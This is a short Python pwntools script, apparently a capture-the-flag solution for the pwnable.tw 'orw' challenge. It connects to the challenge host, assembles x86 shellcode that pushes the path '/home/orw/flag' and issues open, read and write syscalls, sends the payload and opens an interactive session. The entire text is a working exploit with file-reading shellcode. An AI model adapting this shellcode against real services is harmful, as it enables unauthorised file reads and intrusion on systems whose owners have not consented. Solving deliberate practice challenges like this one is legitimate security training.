from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10001

p = remote('chall.pwnable.tw',10001)
print(p.recv())

s = asm("xor eax, eax")
s += asm("push eax")
s += asm("add eax, 5")
s += asm("push 0x67616c66")
s += asm("push 0x2f77726f")
s += asm("push 0x2f656d6f")
s += asm("push 0x682f2f2f")

s += asm("mov ebx, esp")
s += asm("mov edx, 0")
s += asm("int 0x80")
s += asm("mov eax, 3")
s += asm("mov ecx, ebx")
s += asm("mov ebx, 3")
s += asm("mov edx, 40")
s += asm("int 0x80")
s += asm("mov eax, 4")
s += asm("mov ebx, 0")
s += asm("inc ebx")
s += asm("int 0x80")

s += asm("add esp, 200")
s += asm("ret")

p.sendline(s)
p.interactive()


